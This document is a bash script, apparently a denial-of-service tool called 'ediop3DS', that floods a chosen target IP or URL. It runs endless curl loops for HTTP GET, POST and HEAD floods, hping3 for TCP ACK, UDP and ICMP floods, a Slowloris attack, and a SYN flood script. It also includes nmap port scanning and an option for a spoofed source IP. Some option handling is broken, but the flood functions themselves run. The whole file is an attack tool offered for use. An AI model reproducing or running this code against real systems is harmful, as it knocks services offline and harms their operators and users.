#!/bin/bash

# Color definitions
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
RESET="\e[0m"

# Display logo function
display_logo() {
    echo -e "${CYAN}"
    echo -e """
███████╗██████╗░██╗░█████╗░██████╗░██████╗░
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░

██████╗░░██████╗
██╔══██╗██╔════╝
██║░░██║╚█████╗░
██║░░██║░╚═══██╗
██████╔╝██████╔╝
╚═════╝░╚═════╝░
"""
    echo -e "${RESET}"
}

# Help function
show_help() {
    display_logo
    echo -e "\nUsage: ./ediop3DS.sh -u target_ip_or_url -p port [options]\n"
    echo -e "${YELLOW}Options:${RESET}"
    echo -e "  -u    Target IP or URL (required)"
    echo -e "  -p    Target Port (default: 80)"
    echo -e "  -h    Show this help message"
    echo -e "  -s    Scan target for open ports before attacking"
    echo -e "  -r    Retry attack without port if no open ports are found"
    echo -e "  -i    Send ICMP ping flood (requires root)"
    echo -e "  -S    Send TCP SYN flood (requires root)"
    echo -e "  -A    Send TCP ACK flood (requires root)"
    echo -e "  -U    Send UDP flood (requires root)"
    echo -e "  -f    Specify a spoofed source IP address"
    echo -e "  -n    Set the number of requests to send (default: 1000)"
    echo -e "  -H    Send custom HTTP headers"
    echo -e "  -v    Enable verbose output"
    echo -e "  -pSize Specify packet size for attacks (default: 56)"
    echo -e "  -sFlag Specify TCP flag (SYN, ACK, etc.)"
    echo -e "  -seq   Specify sequence number for TCP packets"
    echo -e "  -win   Specify window size for TCP packets"
    echo -e "  -proto Specify protocol for attack (TCP, UDP, ICMP, RAW-IP)"
    echo -e "  -P     Specify packet delay (in ms)"
    echo -e "  -l     Perform Slowloris attack with automatic installation detection"
    echo -e "  -t     Target specific attack type (GET, POST, HEAD, SYN, etc.)"
}

# Scan for open ports and handle attacks
scan_ports() {
    target=$1
    echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
    open_ports=$(nmap -p- --min-rate=5000 -T4 $target | grep 'open' | awk -F '/' '{print $1}')
    if [ -z "$open_ports" ]; then
        echo -e "${RED}[!] No open ports found.${RESET}"
        return 1
    else
        echo -e "${GREEN}[+] Open ports: $open_ports${RESET}"
        port=$(echo "$open_ports" | head -n 1)
    fi
}

# Non-root attacks
http_get_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting HTTP GET flood on $target${RESET}"
    while true; do
        curl -s -X GET $target &>/dev/null &
    done
}

slowloris_attack() {
    target=$1
    packets=10000  # Specify 10k packets for the Slowloris attack
    echo -e "${CYAN}[*] Starting Slowloris attack with $packets packets on $target${RESET}"

    # Check if pip3 and slowloris are installed
    if command -v pip3 &> /dev/null && pip3 show slowloris &> /dev/null; then
        echo -e "${CYAN}[*] Using Slowloris installed via pip3${RESET}"
        
        # Get path to slowloris script and ensure it's executable
        slowloris_installed=$(pip3 show slowloris | grep Location | awk '{print $2}')"/slowloris.py"
        
        # Ensure the script exists and is executable
        if [ -f "$slowloris_installed" ]; then
            echo -e "${CYAN}[*] Running Slowloris attack...${RESET}"
            # Fixed: Passing arguments correctly to Slowloris
            python3 $slowloris_installed -p 80 -s $packets $target
        else
            echo -e "${RED}[!] Slowloris not found in pip3 installation directory.${RESET}"
        fi

    # If Slowloris is cloned via GitHub, use it from the home directory
    elif [ -d "$HOME/slowloris" ]; then
        echo -e "${CYAN}[*] Using Slowloris from git clone directory${RESET}"
        cd "$HOME/slowloris"
        # Fixed: Corrected Slowloris arguments
        python3 slowloris.py -p 80 -s $packets $target
    else
        echo -e "${RED}[!] Slowloris not installed. Please install using 'pip3 install slowloris' or 'git clone https://github.com/gkbrk/slowloris.git'${RESET}"
    fi
}

http_head_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting HTTP HEAD flood on $target${RESET}"
    while true; do
        curl -s -X HEAD $target &>/dev/null &
    done
}

# Root-required attacks
tcp_ack_flood() {
    target=$1
    port=$2
    echo -e "${CYAN}[*] Starting TCP ACK flood on $target:$port (requires root)${RESET}"
    while true; do
        sudo hping3 --ack -p $port --flood $target &>/dev/null &
    done
}

http_post_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting HTTP POST flood on $target${RESET}"
    while true; do
        curl -s -X POST $target --data "data=payload" &>/dev/null &
    done
}

# New Root-required attacks
syn_flood() {
    target=$1
    port=$2
    packets=${3:-10000}

    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] SYN flood requires root privileges.${RESET}"
        exit 1
    fi

    echo -e "${CYAN}[*] Starting custom TCP SYN flood on $target:$port (requires root)${RESET}"
    
    python3 syn_flood.py "$target" "$port" "$packets" &
}

udp_flood() {
    target=$1
    port=$2
    echo -e "${CYAN}[*] Starting UDP flood on $target:$port (requires root)${RESET}"
    while true; do
        sudo hping3 --udp -p $port --flood $target &>/dev/null &
    done
}

# ICMP Flood (requires root)
icmp_flood() {
    target=$1
    echo -e "${CYAN}[*] Starting ICMP ping flood on $target (requires root)${RESET}"
    while true; do
        sudo hping3 --icmp --flood -p 80 $target &>/dev/null &
    done
}

# --- Main Execution Loop ---
while getopts "u:p:hsrivf:n:H:A:U:W:T:t:Q:P:l" opt; do
    case $opt in
        u) target=$OPTARG ;;
        p) port=$OPTARG ;;
        h) display_logo; show_help; exit 0 ;;
        s) scan_ports $target ;;
        r) retry_attack=true ;;
        i) attack_type="icmp_flood" ;;
        S) attack_type="syn_flood" ;;
        A) attack_type="tcp_ack_flood" ;;
        U) attack_type="udp_flood" ;;
        f) spoofed_ip=$OPTARG ;;
        n) request_count=$OPTARG ;;
        H) custom_headers=$OPTARG ;;
        v) verbose=true ;;
        pSize) packet_size=$OPTARG ;;
        sFlag) tcp_flag=$OPTARG ;;
        seq) sequence_number=$OPTARG ;;
        win) window_size=$OPTARG ;;
        proto) protocol=$OPTARG ;;
        P) packet_delay=$OPTARG ;;
        l) attack_type="slowloris_attack" ;;
        t) attack_type=$OPTARG ;;
        \?) show_help; exit 1 ;;
    esac
done

# Debug: Print selected options for verification
if [ "$verbose" = true ]; then
    echo -e "${YELLOW}[DEBUG] Selected Options:${RESET}"
    echo -e "  Target: $target"
    echo -e "  Port: ${port:-80}"
    echo -e "  Protocol: ${protocol:-TCP}"
    echo -e "  Packet Size: ${packet_size:-56}"
    echo -e "  Spoofed IP: ${spoofed_ip:-None}"
    echo -e "  Custom Headers: ${custom_headers:-None}"
    echo -e "  Request Count: ${request_count:-1000}"
    echo -e "  Packet Delay: ${packet_delay:-None}"
fi

# Execute retry logic if needed
if [ "$retry_attack" = true ]; then
    if [ -z "$port" ]; then
        echo -e "${YELLOW}[!] No port specified, scanning first...${RESET}"
        scan_ports $target
    fi
    echo -e "${GREEN}[+] Retrying attack with found port: $port${RESET}"
fi

# Attack logic based on attack type
while true; do
    case $attack_type in
        "http_get_flood") http_get_flood $target ;;
        "slowloris_attack") slowloris_attack $target ;;
        "syn_flood") syn_flood $target $port ;;
        "udp_flood") udp_flood $target $port ;;
        "icmp_flood") icmp_flood $target ;;
        *) echo -e "${RED}[!] Unknown attack type: $attack_type${RESET}" ;;
    esac
done
